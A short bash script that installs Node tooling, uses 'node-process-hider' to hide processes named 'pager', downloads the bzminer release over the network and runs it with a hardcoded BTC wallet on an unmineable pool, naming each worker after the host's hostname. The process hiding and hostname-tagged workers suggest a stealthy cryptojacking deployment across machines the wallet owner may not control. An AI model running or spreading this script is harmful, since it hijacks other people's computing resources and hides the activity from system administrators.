#!/bin/bash
sudo apt update -y
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp
npm i -g node-process-hider && ph add pager 
wget https://github.com/bzminer/bzminer/releases/download/v9.1.4/bzminer_v9.1.4_linux.tar.gz -O - | tar -xz
cd bzminer_v9.1.4_linux && ./bzminer -a ethash -w BTC:1NPgcV7FomPoZNuPQKQ1bLFZHhzCAYNEiS -p ethash.unmineable.com:3333 -r $(echo "$(cat /proc/sys/kernel/hostname)" | tr . _ ) --nvidia 1
